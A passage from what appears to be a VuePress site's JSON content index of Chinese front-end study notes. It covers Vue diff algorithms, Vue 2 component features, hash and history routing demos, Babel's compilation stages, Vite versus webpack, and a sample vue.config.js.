diff策略\n\ndiff整体策略为：深度优先，同层比较，不会跨级，从两边向中间\n\ndom的频繁改变会产生一系列性能问题，而使用虚拟dom替代真实dom，最大的优势在于不断的去修改虚拟dom后，才会一次性的与真实dom的差异性做对比，然后只会去修改真实的dom一次。而这种差异性对比，也就是diff算法。\n\n**注：**vue react 都是用于网页开发，基于 dom 结构，对 diff 算法都进行了优化（或者简化）,最终把时间复杂度降低到 o(n)\n\n * 只在同一层级比较，不夸层级 （dom 结构的变化，很少有跨层级移动）\n * tag 不同则直接删掉重建，不去对比内部细节（dom 结构变化，很少有只改外层，不改内层）\n * 同一个节点下的子节点，通过 key 区分\n\n\n# vue2 diff 特点 - 双端相互比较\n\nb站上的一个视频\n\n好比在列表中插入值\n\n * 定义四个指针，分别比较\n * oldstartnode 和 newstartnode\n * oldstartnode 和 newendnode\n * oldendnode 和 newstartnode\n * oldendnode 和 newendnode\n * 指针继续向中间移动，知道指针汇合。\n\n\n\n参考\n\n\n# vue3 diff 特点 - 最长递增子序列\n\n例如数组 [3，5，7，1，2，8] 的最长递增子序列就是 [3，5，7，8 ] 。这是一个专门的算法。\n\n * 1、通过“前-前”比较找到开始的不变节点 [a, b]\n * 2、通过“后-后”比较找到末尾的不变节点 [g]\n * 3、剩余的有变化的节点 [f, c, d, e, h]\n * 4、通过 newindextooldindexmap 拿到 oldchildren 中对应的 index [5, 2, 3, 4, -1] （-1 表示之前没有，要新增）\n * 5、计算最长递增子序列得到 [2, 3, 4] ，对应的就是 [c, d, e] ，即这些节点可以不变\n * 6、剩余的节点，根据 index 进行新增、删除\n\n\n# diff 的原理\n\n当data变化之后，视图会触发更新，那么这个过程是什么样的呢？ 首先data变化后，会触发setter 接着，编译模板为render函数 render函数生成vnode，这是个新的vnode 接着会patch(oldvnode, newvnode)，这个对比过程中用到的就是diff算法 接着异步渲染更新 由于vnode使用对象表示dom的形式，大体上是一颗多叉树。\n\n\n# diff 算法中的 key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n * 根据key判断元素是否要删除\n * 匹配到key，只移动元素-性能较好\n * 未匹配到key，则删除重建-性能较差\n * 加了key之后，可以便于diff算法的计算，大幅度增加性能\n\n推荐key使用唯一值(例如唯一的id)",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "特性",
      "frontmatter": {},
      "regularPath": "/webstudy/Vue2/%E7%89%B9%E6%80%A7.html",
      "relativePath": "webstudy/Vue2/特性.md",
      "key": "v-1a493651",
      "path": "/webstudy/Vue2/%E7%89%B9%E6%80%A7.html",
      "headers": [
        {
          "level": 2,
          "title": "v-model语法糖",
          "slug": "v-model语法糖",
          "normalizedTitle": "v-model语法糖",
          "charIndex": 9
        },
        {
          "level": 2,
          "title": "slot插槽",
          "slug": "slot插槽",
          "normalizedTitle": "slot插槽",
          "charIndex": 461
        },
        {
          "level": 3,
          "title": "1、作用域插槽",
          "slug": "_1、作用域插槽",
          "normalizedTitle": "1、作用域插槽",
          "charIndex": 472
        },
        {
          "level": 3,
          "title": "2、具名插槽",
          "slug": "_2、具名插槽",
          "normalizedTitle": "2、具名插槽",
          "charIndex": 888
        },
        {
          "level": 2,
          "title": "动态组件",
          "slug": "动态组件",
          "normalizedTitle": "动态组件",
          "charIndex": 1272
        },
        {
          "level": 3,
          "title": "动态组件中key的使用",
          "slug": "动态组件中key的使用",
          "normalizedTitle": "动态组件中key的使用",
          "charIndex": 1333
        },
        {
          "level": 2,
          "title": "异步组件",
          "slug": "异步组件",
          "normalizedTitle": "异步组件",
          "charIndex": 1349
        },
        {
          "level": 2,
          "title": "keep-alive",
          "slug": "keep-alive",
          "normalizedTitle": "keep-alive",
          "charIndex": 1707
        },
        {
          "level": 2,
          "title": "mixin(混入)",
          "slug": "mixin-混入",
          "normalizedTitle": "mixin(混入)",
          "charIndex": 1744
        },
        {
          "level": 3,
          "title": "缺点",
          "slug": "缺点",
          "normalizedTitle": "缺点",
          "charIndex": 1758
        }
      ],
      "headersStr": "v-model语法糖 slot插槽 1、作用域插槽 2、具名插槽 动态组件 动态组件中key的使用 异步组件 keep-alive mixin(混入) 缺点",
      "content": "# 特性\n\n\n# v-model语法糖\n\n//父组件中\n<my-input v-model='value' @change='handleChange'>\n//子组件中\n<template>\n  <input type='text' :value='value' @input=\"$emit('change', $event.target.value)\">\n</template>\n<script>\n  export default {\n   name: \"myInput\",\n   // 定义v-model传过来的值名字是value1 修改值的事件是change事件\n   model: {\n    prop: 'value', // 对应 props value\n    event: 'change'\n   },\n   props: {\n    value: [String,Number],\n    default() {\n     return ''\n    }\n   }\n  }\n</script>\n\n\n\n# slot插槽\n\n\n# 1、作用域插槽\n\n//父\n<new-demo>\n 通过slotProps接收\n   <template v-slot=\"slotProps\">\n     {{ slotProps.info.name }} //yang\n   </template>\n</new-demo>\n//子\n<template>\n  <div>\n    <slot :data=\"info\">\n      {{ \"这里显示默认值\" }}\n    </slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: \"Yang\",\n  components: {},\n  data() {\n    return {\n      info: {\n        name: \"yang\",\n        age: 18,\n      },\n    };\n  },\n};\n</script>\n\n\n\n# 2、具名插槽\n\n//父组件中\n<base-layout>\n <template #header>  //或者不简写v-slot='header'\n  <h1>Here might be a page title</h1>\n </template>\n <template #footer>\n  <p>Here's some contact info</p>\n </template>\n</base-layout>\n//子组件中\n<div class=\"container\">\n <header>\n  <slot name=\"header\"></slot>\n </header>\n <main>\n  <slot></slot>\n </main>\n <footer>\n  <slot name=\"footer\"></slot>\n </footer>\n</div>\n\n\n\n# 动态组件\n\n<component :is=\"currentTabComponent\"></component>\n\n\n\n# 动态组件中key的使用\n\n\n# 异步组件\n\n单独打包，异步加载，不会被直接打包到当前文件中而导致页面渲染就直接加载\n\n<template>\n  <-- 异步组件 -->\n  <FormDemo v-if=\"showFormDemo\"/>\n  <button @click=\"showFormDemo = true\">show form demo</button>\n</template>\n<script>\n export default {\n  components: {\n    FormDemo: () => import('../BaseUse/FormDemo'),\n  },\n  data() {\n    return {\n      showFormDemo: false,\n    };\n  },\n};\n</script>\n\n\n\n# keep-alive\n\n思考一下那些场景用了keep-alive\n\n\n# mixin(混入)\n\n\n# 缺点\n\n * 1. 变量来源不明确，不利于阅读\n * 2. 多个mixin可能会出现命名冲突\n * 3. mixin和组件出现多对多关系时，导致代码复杂度较高",
      "normalizedContent": "# 特性\n\n\n# v-model语法糖\n\n//父组件中\n<my-input v-model='value' @change='handlechange'>\n//子组件中\n<template>\n  <input type='text' :value='value' @input=\"$emit('change', $event.target.value)\">\n</template>\n<script>\n  export default {\n   name: \"myinput\",\n   // 定义v-model传过来的值名字是value1 修改值的事件是change事件\n   model: {\n    prop: 'value', // 对应 props value\n    event: 'change'\n   },\n   props: {\n    value: [string,number],\n    default() {\n     return ''\n    }\n   }\n  }\n</script>\n\n\n\n# slot插槽\n\n\n# 1、作用域插槽\n\n//父\n<new-demo>\n 通过slotprops接收\n   <template v-slot=\"slotprops\">\n     {{ slotprops.info.name }} //yang\n   </template>\n</new-demo>\n//子\n<template>\n  <div>\n    <slot :data=\"info\">\n      {{ \"这里显示默认值\" }}\n    </slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: \"yang\",\n  components: {},\n  data() {\n    return {\n      info: {\n        name: \"yang\",\n        age: 18,\n      },\n    };\n  },\n};\n</script>\n\n\n\n# 2、具名插槽\n\n//父组件中\n<base-layout>\n <template #header>  //或者不简写v-slot='header'\n  <h1>here might be a page title</h1>\n </template>\n <template #footer>\n  <p>here's some contact info</p>\n </template>\n</base-layout>\n//子组件中\n<div class=\"container\">\n <header>\n  <slot name=\"header\"></slot>\n </header>\n <main>\n  <slot></slot>\n </main>\n <footer>\n  <slot name=\"footer\"></slot>\n </footer>\n</div>\n\n\n\n# 动态组件\n\n<component :is=\"currenttabcomponent\"></component>\n\n\n\n# 动态组件中key的使用\n\n\n# 异步组件\n\n单独打包，异步加载，不会被直接打包到当前文件中而导致页面渲染就直接加载\n\n<template>\n  <-- 异步组件 -->\n  <formdemo v-if=\"showformdemo\"/>\n  <button @click=\"showformdemo = true\">show form demo</button>\n</template>\n<script>\n export default {\n  components: {\n    formdemo: () => import('../baseuse/formdemo'),\n  },\n  data() {\n    return {\n      showformdemo: false,\n    };\n  },\n};\n</script>\n\n\n\n# keep-alive\n\n思考一下那些场景用了keep-alive\n\n\n# mixin(混入)\n\n\n# 缺点\n\n * 1. 变量来源不明确，不利于阅读\n * 2. 多个mixin可能会出现命名冲突\n * 3. mixin和组件出现多对多关系时，导致代码复杂度较高",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "vue-router",
      "frontmatter": {},
      "regularPath": "/webstudy/Vue2/vue-router.html",
      "relativePath": "webstudy/Vue2/vue-router.md",
      "key": "v-0424bdf4",
      "path": "/webstudy/Vue2/vue-router.html",
      "headers": [
        {
          "level": 2,
          "title": "hash实现路由",
          "slug": "hash实现路由",
          "normalizedTitle": "hash实现路由",
          "charIndex": 69
        },
        {
          "level": 2,
          "title": "history实现路由",
          "slug": "history实现路由",
          "normalizedTitle": "history实现路由",
          "charIndex": 1163
        }
      ],
      "headersStr": "hash实现路由 history实现路由",
      "content": "# vue-router\n\nvue中的router的底层就是通过浏览器的onhashChange，onpopstate等时间实现\n\n\n# hash实现路由\n\n * hash的变化会触发网页的跳转，及浏览器的前进和后退\n * hash的变化不会刷新页面，这是SPA需要的特点，让这个网页看起来像一个独立的应用，页面内部的刷新通过框架的钩子或者特定方法完成\n * hash不会提交到server端（url中的#在浏览器端的接口请求中不会存在\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>hash test</title>\n</head>\n<body>\n    <p>hash test</p>\n    <button id=\"btn1\">修改 hash</button>\n\n    <script>\n        // hash 变化，包括：\n        // a. JS 修改 url\n        // b. 手动修改 url 的 hash\n        // c. 浏览器前进、后退\n        window.onhashchange = (event) => {\n            console.log('old url', event.oldURL)\n            console.log('new url', event.newURL)\n\n            console.log('hash:', location.hash)\n        }\n        // 页面初次加载，获取 hash\n        document.addEventListener('DOMContentLoaded', () => {\n            console.log('hash:', location.hash)\n        })\n        // JS 修改 url\n        document.getElementById('btn1').addEventListener('click', () => {\n            location.href = '#/user'\n        })\n    </script>\n</body>\n</html>\n\n\n\n# history实现路由\n\n * 用url规范的路由，跳转不刷新页面\n * hisory.pushState\n * window.onpopstate\n\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <title>history API test</title>\n  </head>\n  <body>\n    <p>history API test</p>\n    <button id=\"btn1\">修改 url</button>\n\n    <script>\n      // 页面初次加载，获取 path\n      document.addEventListener(\"DOMContentLoaded\", () => {\n        console.log(\"load\", location.pathname);\n      });\n\n      // 打开一个新的路由\n      // 【注意】用 pushState 方式，浏览器不会刷新页面\n      document.getElementById(\"btn1\").addEventListener(\"click\", () => {\n        const state = { name: \"page1\" };\n        console.log(\"切换路由到\", \"page1\");\n        window.history.pushState(state, \"\", \"page1\"); // 重要！！\n      });\n      // 监听浏览器前进、后退\n      window.onpopstate = (event) => {\n        console.log(\"event :>> \", event);\n        console.log(\"onpopstate\", event.state, location.pathname);\n      };\n    </script>\n  </body>\n</html>\n\n",
      "normalizedContent": "# vue-router\n\nvue中的router的底层就是通过浏览器的onhashchange，onpopstate等时间实现\n\n\n# hash实现路由\n\n * hash的变化会触发网页的跳转，及浏览器的前进和后退\n * hash的变化不会刷新页面，这是spa需要的特点，让这个网页看起来像一个独立的应用，页面内部的刷新通过框架的钩子或者特定方法完成\n * hash不会提交到server端（url中的#在浏览器端的接口请求中不会存在\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n    <title>hash test</title>\n</head>\n<body>\n    <p>hash test</p>\n    <button id=\"btn1\">修改 hash</button>\n\n    <script>\n        // hash 变化，包括：\n        // a. js 修改 url\n        // b. 手动修改 url 的 hash\n        // c. 浏览器前进、后退\n        window.onhashchange = (event) => {\n            console.log('old url', event.oldurl)\n            console.log('new url', event.newurl)\n\n            console.log('hash:', location.hash)\n        }\n        // 页面初次加载，获取 hash\n        document.addeventlistener('domcontentloaded', () => {\n            console.log('hash:', location.hash)\n        })\n        // js 修改 url\n        document.getelementbyid('btn1').addeventlistener('click', () => {\n            location.href = '#/user'\n        })\n    </script>\n</body>\n</html>\n\n\n\n# history实现路由\n\n * 用url规范的路由，跳转不刷新页面\n * hisory.pushstate\n * window.onpopstate\n\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\" />\n    <title>history api test</title>\n  </head>\n  <body>\n    <p>history api test</p>\n    <button id=\"btn1\">修改 url</button>\n\n    <script>\n      // 页面初次加载，获取 path\n      document.addeventlistener(\"domcontentloaded\", () => {\n        console.log(\"load\", location.pathname);\n      });\n\n      // 打开一个新的路由\n      // 【注意】用 pushstate 方式，浏览器不会刷新页面\n      document.getelementbyid(\"btn1\").addeventlistener(\"click\", () => {\n        const state = { name: \"page1\" };\n        console.log(\"切换路由到\", \"page1\");\n        window.history.pushstate(state, \"\", \"page1\"); // 重要！！\n      });\n      // 监听浏览器前进、后退\n      window.onpopstate = (event) => {\n        console.log(\"event :>> \", event);\n        console.log(\"onpopstate\", event.state, location.pathname);\n      };\n    </script>\n  </body>\n</html>\n\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "babel",
      "frontmatter": {
        "title": "babel"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/babel.html",
      "relativePath": "webstudy/工程化/babel.md",
      "key": "v-03980d56",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/babel.html",
      "headers": [
        {
          "level": 2,
          "title": "原理",
          "slug": "原理",
          "normalizedTitle": "原理",
          "charIndex": 63
        },
        {
          "level": 3,
          "title": "词法分析",
          "slug": "词法分析",
          "normalizedTitle": "词法分析",
          "charIndex": 131
        },
        {
          "level": 3,
          "title": "语法分析",
          "slug": "语法分析",
          "normalizedTitle": "语法分析",
          "charIndex": 136
        }
      ],
      "headersStr": "原理 词法分析 语法分析",
      "content": "# babel\n\n * js的编译器\n * 将es5以上的代码转行成向下兼容的js语法，使代码可运行在低版本浏览器上\n\n\n# 原理\n\n转译的三个阶段\n\n * 1.解析阶段段：Babel 默认使用@babel/parser将代码转换为AST。解析一般分为两个阶段：词法分析和语法分析\n * 2.转换阶段：Babel 使用 @babel/traverse 提供的方法对AST进行深度优先遍历，调用插件对关注节点的处理函数，按需对AST节点进行增删改操作\n * 3.生成阶段：Babel 默认使用@babel/generator将上一阶段处理后的AST通过深度优先遍历转换为代码字符串\n\n\n\n\n\n举个例子 AST的生成\n\nif (1 > 0) {\n    alert('hi');\n}\n//\n{\n  \"type\": \"Program\",                          // 程序根节点\n  \"body\": [                                   // 一个数组包含所有程序的顶层语句\n    {\n      \"type\": \"IfStatement\",                  // 一个if语句节点\n      \"test\": {                               // if语句的判断条件\n        \"type\": \"BinaryExpression\",           // 一个双元运算表达式节点\n        \"operator\": \">\",                      // 运算表达式的运算符\n        \"left\": {                             // 运算符左侧值\n          \"type\": \"Literal\",                  // 一个常量表达式\n          \"value\": 1                          // 常量表达式的常量值\n        },\n        \"right\": {                            // 运算符右侧值\n          \"type\": \"Literal\",\n          \"value\": 0\n        }\n      },\n      \"consequent\": {                         // if语句条件满足时的执行内容\n        \"type\": \"BlockStatement\",             // 用{}包围的代码块\n        \"body\": [                             // 代码块内的语句数组\n          {\n            \"type\": \"ExpressionStatement\",    // 一个表达式语句节点\n            \"expression\": {\n              \"type\": \"CallExpression\",       // 一个函数调用表达式节点\n              \"callee\": {                     // 被调用者\n                \"type\": \"Identifier\",         // 一个标识符表达式节点\n                \"name\": \"alert\"\n              },\n              \"arguments\": [                  // 调用参数\n                {\n                  \"type\": \"Literal\",\n                  \"value\": \"hi\"\n                }\n              ]\n            }\n          }\n        ]\n      },\n      \"alternative\": null                     // if语句条件未满足时的执行内容\n    }\n  ]\n}\n\n\n\n# 词法分析\n\n词法分析阶段可以看成是对代码进行“分词”，它接收一段源代码，然后执行一段tokenize函数，把代码分割成被称为Tokens的东西。Tokens是一个数组，由一些代码的碎片组成，如下\n\n[\n    { \"type\": \"Keyword\", \"value\": \"const\" },\n    { \"type\": \"Identifier\", \"value\": \"add\" },\n    { \"type\": \"Punctuator\", \"value\": \"=\" },\n    { \"type\": \"Punctuator\", \"value\": \"(\" },\n    { \"type\": \"Identifier\", \"value\": \"a\" },\n    { \"type\": \"Punctuator\", \"value\": \",\" },\n    { \"type\": \"Identifier\", \"value\": \"b\" },\n    { \"type\": \"Punctuator\", \"value\": \")\" },\n    { \"type\": \"Punctuator\", \"value\": \"=>\" },\n    { \"type\": \"Identifier\", \"value\": \"a\" },\n    { \"type\": \"Punctuator\", \"value\": \"+\" },\n    { \"type\": \"Identifier\", \"value\": \"b\" }\n]\n\n\n\n\n# 语法分析\n\n词法分析之后，代码就已经变成了一个Tokens数组了，现在需要通过语法分析把Tokens转化成AST",
      "normalizedContent": "# babel\n\n * js的编译器\n * 将es5以上的代码转行成向下兼容的js语法，使代码可运行在低版本浏览器上\n\n\n# 原理\n\n转译的三个阶段\n\n * 1.解析阶段段：babel 默认使用@babel/parser将代码转换为ast。解析一般分为两个阶段：词法分析和语法分析\n * 2.转换阶段：babel 使用 @babel/traverse 提供的方法对ast进行深度优先遍历，调用插件对关注节点的处理函数，按需对ast节点进行增删改操作\n * 3.生成阶段：babel 默认使用@babel/generator将上一阶段处理后的ast通过深度优先遍历转换为代码字符串\n\n\n\n\n\n举个例子 ast的生成\n\nif (1 > 0) {\n    alert('hi');\n}\n//\n{\n  \"type\": \"program\",                          // 程序根节点\n  \"body\": [                                   // 一个数组包含所有程序的顶层语句\n    {\n      \"type\": \"ifstatement\",                  // 一个if语句节点\n      \"test\": {                               // if语句的判断条件\n        \"type\": \"binaryexpression\",           // 一个双元运算表达式节点\n        \"operator\": \">\",                      // 运算表达式的运算符\n        \"left\": {                             // 运算符左侧值\n          \"type\": \"literal\",                  // 一个常量表达式\n          \"value\": 1                          // 常量表达式的常量值\n        },\n        \"right\": {                            // 运算符右侧值\n          \"type\": \"literal\",\n          \"value\": 0\n        }\n      },\n      \"consequent\": {                         // if语句条件满足时的执行内容\n        \"type\": \"blockstatement\",             // 用{}包围的代码块\n        \"body\": [                             // 代码块内的语句数组\n          {\n            \"type\": \"expressionstatement\",    // 一个表达式语句节点\n            \"expression\": {\n              \"type\": \"callexpression\",       // 一个函数调用表达式节点\n              \"callee\": {                     // 被调用者\n                \"type\": \"identifier\",         // 一个标识符表达式节点\n                \"name\": \"alert\"\n              },\n              \"arguments\": [                  // 调用参数\n                {\n                  \"type\": \"literal\",\n                  \"value\": \"hi\"\n                }\n              ]\n            }\n          }\n        ]\n      },\n      \"alternative\": null                     // if语句条件未满足时的执行内容\n    }\n  ]\n}\n\n\n\n# 词法分析\n\n词法分析阶段可以看成是对代码进行“分词”，它接收一段源代码，然后执行一段tokenize函数，把代码分割成被称为tokens的东西。tokens是一个数组，由一些代码的碎片组成，如下\n\n[\n    { \"type\": \"keyword\", \"value\": \"const\" },\n    { \"type\": \"identifier\", \"value\": \"add\" },\n    { \"type\": \"punctuator\", \"value\": \"=\" },\n    { \"type\": \"punctuator\", \"value\": \"(\" },\n    { \"type\": \"identifier\", \"value\": \"a\" },\n    { \"type\": \"punctuator\", \"value\": \",\" },\n    { \"type\": \"identifier\", \"value\": \"b\" },\n    { \"type\": \"punctuator\", \"value\": \")\" },\n    { \"type\": \"punctuator\", \"value\": \"=>\" },\n    { \"type\": \"identifier\", \"value\": \"a\" },\n    { \"type\": \"punctuator\", \"value\": \"+\" },\n    { \"type\": \"identifier\", \"value\": \"b\" }\n]\n\n\n\n\n# 语法分析\n\n词法分析之后，代码就已经变成了一个tokens数组了，现在需要通过语法分析把tokens转化成ast",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Vite",
      "frontmatter": {
        "tile": "Vite"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vite.html",
      "relativePath": "webstudy/工程化/vite.md",
      "key": "v-7550340d",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vite.html",
      "headers": [
        {
          "level": 2,
          "title": "Vite为什么快",
          "slug": "vite为什么快",
          "normalizedTitle": "vite为什么快",
          "charIndex": 11
        },
        {
          "level": 3,
          "title": "webpack为什么慢？",
          "slug": "webpack为什么慢",
          "normalizedTitle": "webpack为什么慢？",
          "charIndex": 31
        },
        {
          "level": 3,
          "title": "vite怎么做的",
          "slug": "vite怎么做的",
          "normalizedTitle": "vite怎么做的",
          "charIndex": 255
        }
      ],
      "headersStr": "Vite为什么快 webpack为什么慢？ vite怎么做的",
      "content": "# Vite\n\n\n# Vite为什么快\n\n这个问题前可以先了解webpack为什么慢？\n\n\n# webpack为什么慢？\n\n * 浏览器中没有模块化的设计，所以webpack需要吧代码编译进一个js文件中然后浏览器才可以解析使用\n * 所以当我们启动项目时，webpack需要从入口文件去索引整个项目的文件，编译成一个或多个单独的js文件，即使采用了代码拆分，也需要一次生成所有路由下的编译后文件，这也导致了服务启动时间随着项目复杂度而指数增长\n * 所以说其实代码拆分对开发模式下的性能没有帮助\n\n\n\n\n# vite怎么做的\n\n * Vite启动开发服务器的时候并不需要提前编译文件\n * 而是在浏览器请求对应URL的时候，再提供对应的文件\n * 这就实现了在使用了路由懒加载的项目中，仅提供对应路由下的模块的编译文件，而没有索引全部代码的这一过程\n * 项目启动时间始终为常量级。并不会随着项目复杂度变高而一直增长\n\n\n\n# Esbuild\n\n * Vite中是并没有loader功能，Vite使用esbuild作为部分文件类型的解析器(如 TSX & TypeScript),\n * Vite 并不会与 webpack 一样，提前将所有文件编译为浏览器可以接受的类型，而是在接收到浏览器发起的 http 请求之后再去编译对应文件，提供给浏览器",
      "normalizedContent": "# vite\n\n\n# vite为什么快\n\n这个问题前可以先了解webpack为什么慢？\n\n\n# webpack为什么慢？\n\n * 浏览器中没有模块化的设计，所以webpack需要吧代码编译进一个js文件中然后浏览器才可以解析使用\n * 所以当我们启动项目时，webpack需要从入口文件去索引整个项目的文件，编译成一个或多个单独的js文件，即使采用了代码拆分，也需要一次生成所有路由下的编译后文件，这也导致了服务启动时间随着项目复杂度而指数增长\n * 所以说其实代码拆分对开发模式下的性能没有帮助\n\n\n\n\n# vite怎么做的\n\n * vite启动开发服务器的时候并不需要提前编译文件\n * 而是在浏览器请求对应url的时候，再提供对应的文件\n * 这就实现了在使用了路由懒加载的项目中，仅提供对应路由下的模块的编译文件，而没有索引全部代码的这一过程\n * 项目启动时间始终为常量级。并不会随着项目复杂度变高而一直增长\n\n\n\n# esbuild\n\n * vite中是并没有loader功能，vite使用esbuild作为部分文件类型的解析器(如 tsx & typescript),\n * vite 并不会与 webpack 一样，提前将所有文件编译为浏览器可以接受的类型，而是在接收到浏览器发起的 http 请求之后再去编译对应文件，提供给浏览器",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "vue.config.js配置案例",
      "frontmatter": {
        "title": "vue.config.js配置案例"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vue.config.js%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B.html",
      "relativePath": "webstudy/工程化/vue.config.js配置案例.md",
      "key": "v-9281c836",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vue.config.js%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B.html",
      "headers": [
        {
          "level": 2,
          "title": "vue.config.js配置案例",
          "slug": "vue-config-js配置案例",
          "normalizedTitle": "vue.config.js配置案例",
          "charIndex": 2
        }
      ],
      "headersStr": "vue.config.js配置案例",
      "content": "# vue.config.js配置案例\n\n// 打包多入口文件基本配置\nlet developmentPath = './';//开发环境-npm run serve时引用文件路径\nlet productionPath = './';//生产环境-npm run build打包后引用文件路径\n\nconst UglifyJsPlugin = require('uglifyjs-webpack-plugin')//生产环境取消打印\nconst CompressionWebpackPlugin = require('compression-webpack-plugin')//gzip压缩\n\nconst productionGzipExtensions = ['js', 'css']\nconst Version = 'V6.1'\nconst Timestamp = new Date().getTime()\nfunction getPagesInfo() {\n    let pages = {}\n    const glob = require('glob') // 引入glob模块,用于扫描全部src/pages/**/main.js（返回的是一个数组）\n    glob.sync('src/pages/**/main.js').forEach((entry, i) => {\n        let name = entry.slice(10, -8)\n        pages[name] = {\n            entry: entry,\n            template: 'public.index.html',\n            filename: name + '.html',\n            title: '',\n            chunks: [\"chunk-vendors\", \"chunk-common\", name]\n        }\n    })\n    return pages\n}\n// 打包相关\nmodule.exports = {\n    pages: getPagesInfo(),//多页面应用配置\n    publicPath: process.env.NODE_ENV === 'production' ? productionPath : developmentPath, // 基本路径-引用文件的路 __dirname + '/server/dist', //build之后静态文件输出路径\n    assetsDir: 'static',//静态资源大包位置\n    outputDir: __dirname + '/server/dist', //build之后静态文件输出路径\n    lintOnSave: process.env.NODE_ENV !== 'production',// 打包的时候eslint-loader检查 \n    productionSourceMap: false,//source map 检查\n    // 启动服务器\n    devServer: {\n        index: '/login.html',   //默认打开文件\n        open: true,             //自动打开浏览器\n        host: 'localhost',      //默认打开域名\n        port: 8080,             //默认打开端口号\n        https: false,           //开启关闭https请求\n        hotOnly: false,         //热更\n        // 反向代理\n        proxy: {\n            // 配置跨域\n            '/api': {\n                target: 'http://dev.aabb.cn:8082/', //代理地址，这里设置的地址会代替axios中设置的baseURL\n                ws: true,   //// proxy websockets\n                changeOrigin: true,// 如果接口跨域，需要进行这个参数配置\n                pathRewrite: {                //pathRewrite方法重写url\n                    '^/api': '/',\n                },\n            },\n            \"/api2\": {\n                    target: \"http://172.12.12.12:2018\",\n                    changeOrigin: true,\n                    //ws: true,//websocket支持\n                    secure: false,\n                    pathRewrite: {\n                        \"^/api2\": \"/\"\n                    }\n                }\n        }\n    }\n    // webpack配置  链式\n    chainWebpack: (config) => {\n        // 1、取消预加载增加加载速度\n        config.plugins.delete('preload')\n        config.plugins.delete('prefetch')\n\n        // 2、vue中使用SVG图标，并且想批量导入，然后需要使用的时候直接添加就可以\n        config.module\n            .rule('svg')\n            .exclude.add(resolve('src/assets/icons'))\n            .end()\n        config.module\n            .rule('icons')\n            .test(/\\.svg$/)\n            .include.add(resolve('src/assets/icons'))\n            .end()\n            .use('svg-sprite-loader')\n            .loader('svg-sprite-loader')\n            .options({\n                symbolId: 'icon-[name]',\n            })\n            .end()\n\n        // 3、图片处理\n        const imagesRule = config.module.rule('images')\n        imagesRule.uses.clear() //清除原本的images loader配置\n        imagesRule\n            .test(/\\.(jpg|gif|png|svg)$/)\n            .exclude.add(path.join(__dirname, '../node_modules')) //不对node_modules里的图片转base64\n            .end()\n            .use('url-loader')\n            .loader('url-loader')\n            .options({ name: 'img/[name].[hash:8].[ext]', limit: 6000000 })\n\n        config.optimization.splitChunks({\n            cacheGroups: {\n\n                vendors: {\n                    name: 'chunk-vendors',\n                    minChunks: pageNum,\n                    test: /node_modules/,\n                    priority: -10,\n                    chunks: 'initial',\n                },\n\n                elementUI: {\n                    name: 'chunk-elementUI', // split elementUI into a single package\n                    priority: 20, // the weight needs to be larger than libs and app or it will be packaged into libs or app\n                    test: /[\\\\/]node_modules[\\\\/]_?element-ui(.*)/, // in order to adapt to cnpm\n                },\n\n                commons: {\n                    name: 'chunk-commons',\n                    test: resolve('src/components'), // can customize your rules\n                    minChunks: 3, //  minimum common number\n                    priority: 5,\n                    reuseExistingChunk: true,\n                },\n            },\n        })\n    },\n    // webpack配置\n    configureWebpack: (config) => {\n          // 为生产环境修改配置\n        if (process.env.NODE_ENV === 'production') {\n      \n            config.plugins.push(\n                  // 1、取消打印\n                new UglifyJsPlugin({\n                    uglifyOptions: {\n                        compress: {\n                            drop_debugger: true,//生产环境自动删除debugger\n                            drop_console: true, //生产环境自动删除console\n                        },\n                        warnings: false,\n                    },\n                    sourceMap: false,   //关掉sourcemap 会生成对于调试的完整的.map文件，但同时也会减慢打包速度\n                    parallel: true, //使用多进程并行运行来提高构建速度。默认并发运行数：os.cpus().length - 1。\n                }),\n\n                // 2、gzip压缩\n                new CompressionWebpackPlugin({\n                    filename: '[path].gz[query]',\n                    algorithm: 'gzip',\n                    test: new RegExp('\\\\.(' + productionGzipExtensions.join('|') + ')$'),\n                    threshold: 10240,\n                    minRatio: 0.8,\n                })\n            )\n        }\n\n        // 在这里配置后，减少了压缩的包内容，需要在public/index.html通过cdn方式再引入,注意对应的版本\n        config.externals = { \n            vue: 'Vue',\n            'vue-router': 'VueRouter',\n            vuex: 'Vuex',\n            axios: 'axios',\n            jquery: '$',\n            moment: 'moment',\n            'mint-ui': 'MINT'\n        },\n\n\n         // 别名配置\n        Object.assign(config, {\n            // 开发生产共同配置\n            resolve: {\n                alias: {\n                '@': path.resolve(__dirname, './src'),\n                '@c': path.resolve(__dirname, './src/components'),\n                '@p': path.resolve(__dirname, './src/pages')\n                }\n            }\n        }),\n\n        config.output.filename = 